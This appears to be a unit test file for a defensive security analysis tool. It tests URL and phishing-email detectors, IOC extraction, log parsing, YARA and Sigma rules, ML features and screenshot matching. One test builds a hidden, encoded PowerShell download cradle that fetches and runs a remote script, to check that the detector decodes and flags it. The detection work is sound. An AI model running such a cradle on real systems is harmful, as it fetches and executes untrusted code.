"""Unit tests: parsers, IOC extraction, detectors, ML features, vision, Sigma evaluator."""
import base64
from datetime import datetime, timezone

from app.analysis import email as email_an
from app.analysis import logs as logs_an
from app.analysis.file import analyse_file, detect_file
from app.analysis.ioc import extract_iocs, registered_domain
from app.analysis.url import analyse_url, brand_lookalike, classify_score, damerau_levenshtein
from app.ingestion.store import fingerprint
from app.ml.features import FEATURES, canonical, extract_features
from app.rules.sigma_eval import rule_matches
from app.vision import similarity
from conftest import SAMPLES


# ---- URL parser ----
def test_url_ip_host_and_userinfo():
    a = analyse_url("http://admin@192.0.2.55:8080/login")
    ids = {s["id"] for s in a["signals"]}
    assert {"ip_host", "userinfo_in_url", "non_standard_port"} <= ids
    assert classify_score(a["score"])[0] == "suspicious"


def test_url_typosquat_homoglyph_and_legit():
    assert any(h["kind"] == "typosquat" for h in brand_lookalike("paypaI-x.com")) is False  # different label entirely
    assert brand_lookalike("paypa1.com")[0]["brand"] == "paypal"
    assert brand_lookalike("micros0ft.com")[0]["brand"] == "microsoft"
    assert brand_lookalike("www.paypal.com") == []          # the real domain never matches
    assert brand_lookalike("login.microsoftonline.com") == []
    assert damerau_levenshtein("gogle", "google") == 1 and damerau_levenshtein("googel", "google") == 1


def test_url_shortener_and_benign():
    assert "url_shortener" in {s["id"] for s in analyse_url("https://bit.ly/3xYz")["signals"]}
    clean = analyse_url("https://www.example.org/docs/getting-started")
    assert clean["signals"] == [] and classify_score(clean["score"])[0] == "benign"


def test_url_structure_never_confirms_malicious():
    worst = analyse_url("http://user@paypa1.secure-login.verify-account.update.xn--pypal-4ve.tk:8081/login/verify.pdf.exe?redirect=http://x.example")
    assert classify_score(worst["score"])[0] == "suspicious"   # structure alone is capped at suspicious


def test_malformed_url():
    assert analyse_url("http://[::1")["valid"] is False


# ---- IOC extraction ----
def test_ioc_extraction_and_defang():
    t = "Beacon to hxxp://evil[.]example/a.php from 203.0.113.9; mail bob@corp.example; file report.pdf and cmd.exe; hash " + "a" * 64
    i = extract_iocs(t)
    assert "http://evil.example/a.php" in i["url"] and "203.0.113.9" in i["ip"] and "bob@corp.example" in i["email"]
    assert "a" * 64 in i["sha256"] and "report.pdf" not in i["domain"] and "cmd.exe" not in i["domain"]
    assert registered_domain("a.b.paypa1-secure-login.example") == "paypa1-secure-login.example"


# ---- Email parser ----
def test_phishing_email_parse_and_detect():
    p = email_an.parse_email((SAMPLES / "phishing_email.eml").read_bytes())
    assert p["from_addr"] == "service@paypal.com.mailer-svc.example" and p["auth"] == {"spf": "fail", "dkim": "none", "dmarc": "fail"}
    assert p["attachments"][0]["filename"] == "Invoice_8842.pdf.exe" and len(p["attachments"][0]["sha256"]) == 64
    assert [l["href"] for l in p["links"]] == ["http://paypa1-secure-login.example/account/verify?id=8842"]  # link TEXT is not treated as a destination
    dets, hops = email_an.detect_email(p)
    names = {d["detector"] for d in dets}
    assert {"email.link_text_mismatch", "email.reply_to_mismatch", "email.spf_fail", "email.dmarc_fail", "email.attachment_double_extension", "email.phishing_language", "email.brand_display_name"} <= names
    assert hops == ["203.0.113.150"]


def test_benign_email_has_no_suspicious_detection():
    dets, _ = email_an.detect_email(email_an.parse_email((SAMPLES / "benign_email.eml").read_bytes()))
    assert [d["detector"] for d in dets] == ["email.auth_pass"] and dets[0]["classification"] == "benign"


def test_garbage_email_does_not_crash():
    p = email_an.parse_email(b"\xff\xfe\x00garbage\r\n\r\n\x00\x01")
    assert p["from_addr"] == "" and email_an.detect_email(p)[0][0]["detector"] == "email.no_auth_results"


# ---- Evidence normalisation ----
def test_json_event_normalisation_variants():
    ecs = logs_an.normalise_json_event({"@timestamp": "2026-11-03T09:00:00Z", "event": {"category": "authentication", "outcome": "failure"}, "source": {"ip": "198.51.100.9"}, "user": {"name": "root"}}, 0)
    assert (ecs.category, ecs.outcome, ecs.src_ip, ecs.user) == ("authentication", "failure", "198.51.100.9", "root") and ecs.timestamp == datetime(2026, 11, 3, 9, tzinfo=timezone.utc)
    win = logs_an.normalise_json_event({"TimeCreated": "2026-11-03 09:00:01", "Channel": "Security", "EventID": "4625", "TargetUserName": "admin", "IpAddress": "203.0.113.4"}, 1)
    assert (win.category, win.action, win.outcome, win.data["event_id"]) == ("authentication", "logon", "failure", 4625)
    sysmon = logs_an.normalise_json_event({"UtcTime": "2026-11-03 09:00:02", "Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "SourceIp": "10.0.0.5", "DestinationIp": "203.0.113.66", "DestinationPort": "8081"}, 2)
    assert (sysmon.category, sysmon.dst_ip, sysmon.dst_port) == ("network", "203.0.113.66", 8081)
    assert logs_an.normalise_json_event("not a dict", 3) is None


def test_auth_log_parsing():
    evs, unparsed = logs_an.parse_auth_log((SAMPLES / "ssh_bruteforce_auth.log").read_text(), 2026)
    assert sum(e.outcome == "failure" and e.src_ip == "198.51.100.23" for e in evs) == 46
    assert any(e.action == "sudo_command" and "shadow" in e.data["command_line"] for e in evs) and unparsed == 0
    assert all(e.timestamp.year == 2026 for e in evs)


def test_duplicate_fingerprint_is_stable():
    a = logs_an.normalise_json_event({"@timestamp": "2026-11-03T09:00:00.100Z", "EventID": 4625, "Channel": "Security", "TargetUserName": "x", "IpAddress": "1.2.3.4"}, 0)
    b = logs_an.normalise_json_event({"@timestamp": "2026-11-03T09:00:00.900Z", "EventID": 4625, "Channel": "Security", "TargetUserName": "x", "IpAddress": "1.2.3.4"}, 7)
    c = logs_an.normalise_json_event({"@timestamp": "2026-11-03T09:00:02Z", "EventID": 4625, "Channel": "Security", "TargetUserName": "x", "IpAddress": "1.2.3.4"}, 8)
    assert fingerprint(a) == fingerprint(b) != fingerprint(c)


# ---- Detection rules ----
def test_brute_force_threshold_and_window():
    mk = lambda n, gap: [logs_an.normalise_json_event({"@timestamp": f"2026-11-03T09:{(i * gap) // 60:02d}:{(i * gap) % 60:02d}Z", "EventID": 4625, "Channel": "Security", "TargetUserName": "admin", "IpAddress": "203.0.113.4"}, i) for i in range(n)]
    assert logs_an.detect_log_events(mk(7, 2)) == []                                   # below threshold
    assert logs_an.detect_log_events(mk(8, 2))[0]["detector"] == "auth.brute_force"    # at threshold
    assert logs_an.detect_log_events(mk(9, 240)) == []                                 # 9 failures spread over 32 min: never 8 inside 10 min


def test_powershell_detection_decodes_payload_without_executing():
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.66/a.ps1')"
    cmd = "powershell.exe -nop -w hidden -enc " + base64.b64encode(payload.encode("utf-16-le")).decode()
    ev = logs_an.normalise_json_event({"@timestamp": "2026-11-03T09:00:00Z", "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Image": "C:\\Windows\\powershell.exe", "CommandLine": cmd}, 0)
    d = logs_an.detect_log_events([ev])[0]
    assert d["detector"] == "process.suspicious_powershell" and d["details"]["decoded_command"] == payload
    assert {"encoded_command", "hidden_window", "download_cradle_in_decoded"} <= set(d["details"]["matched"])
    benign = logs_an.normalise_json_event({"@timestamp": "2026-11-03T09:00:00Z", "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Image": "powershell.exe", "CommandLine": "powershell.exe -NoProfile -File backup.ps1"}, 1)
    assert logs_an.detect_log_events([benign]) == []


def test_yara_fixture_and_static_rules():
    fx = analyse_file((SAMPLES / "yara_test_fixture.txt").read_bytes(), "yara_test_fixture.txt", "text/plain")
    d = detect_file(fx, "yara_test_fixture.txt")
    assert [m["rule"] for m in fx["yara"]] == ["ARGUS_Test_Fixture"] and d[0]["classification"] == "benign"  # fixture is flagged as a harmless self-test
    dr = analyse_file((SAMPLES / "dropper_script_sample.txt").read_bytes(), "dropper_script_sample.txt", "text/plain")
    assert "ARGUS_PowerShell_Encoded_Downloader" in [m["rule"] for m in dr["yara"]]
    assert all(x["classification"] != "confirmed_malicious" for x in detect_file(dr, "x.txt"))  # no bundled rule is malicious-class
    clean = analyse_file((SAMPLES / "benign_files" / "backup.ps1").read_bytes(), "backup.ps1", "text/plain")
    assert clean["yara"] == [] and detect_file(clean, "backup.ps1") == []


# ---- ML feature extraction ----
def test_ml_features_ignore_scheme_and_www():
    a, b = extract_features("https://www.example.org/a/b?x=1"), extract_features("http://example.org/a/b?x=1")
    assert a == b and set(a) == set(FEATURES)
    assert canonical("HTTPS://WWW.Example.org/x") == "Example.org/x"
    f = extract_features("http://192.0.2.1/login/verify.php?a=1&b=2")
    assert f["has_ip_host"] == 1 and f["num_params"] == 2 and f["has_file_ext_php_html"] == 1 and f["suspicious_token_count"] >= 2


def test_ml_models_are_real_and_evaluated():
    from app.ml import anomaly, phishing
    pm, am = phishing.model_metrics(), anomaly.model_metrics()
    assert pm["split"]["shared_domains"] == 0 and 0.85 < pm["test_metrics_threshold_0.5"]["accuracy"] < 0.99
    assert am["metrics"]["roc_auc"] > 0.9 and "SYNTHETIC" in am["limitations"][0]
    p1, p2 = phishing.predict("http://paypa1.verify-account-login.example/secure/update/login.php?id=83838&session=abc"), phishing.predict("https://www.example.org/docs/getting-started")
    assert 0 <= p2["probability"] < p1["probability"] <= 1 and p1["contributions"]


# ---- Vision ----
def test_screenshot_similarity_match_and_non_match():
    hit = similarity.compare((SAMPLES / "lookalike_signin.jpg").read_bytes())
    assert hit["matches"][0]["reference"].startswith("Northwind Bank") and hit["matches"][0]["is_match"] and not hit["matches"][1]["is_match"]
    miss = similarity.compare((SAMPLES / "unrelated_blog.png").read_bytes())
    assert not any(m["is_match"] for m in miss["matches"])
    assert "error" in similarity.compare(b"not an image")
    assert similarity.metadata((SAMPLES / "lookalike_signin.jpg").read_bytes())["width"] == 1152


# ---- Sigma evaluator ----
def test_sigma_evaluator_conditions():
    ev = {"category": "process", "action": "process_start", "summary": "", "data": {"command_line": "powershell.exe -w hidden -enc AAAA", "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}
    rule = {"logsource": {"product": "windows", "category": "process_creation"},
            "detection": {"selection_img": {"Image|endswith": "\\powershell.exe"}, "selection_enc": {"CommandLine|contains": [" -enc ", " -e "]}, "filter": {"CommandLine|contains": "backup"},
                          "condition": "selection_img and selection_enc and not filter"}}
    assert rule_matches(rule, ev)
    ev2 = {**ev, "data": {**ev["data"], "command_line": "powershell.exe -enc AAAA backup"}}
    assert not rule_matches(rule, ev2)
    assert not rule_matches({**rule, "detection": {**rule["detection"], "condition": "all of selection_* and filter"}}, ev)
    assert rule_matches({**rule, "detection": {**rule["detection"], "condition": "1 of selection_* or filter"}}, ev)
    assert not rule_matches(rule, {**ev, "category": "network"})  # logsource category is enforced
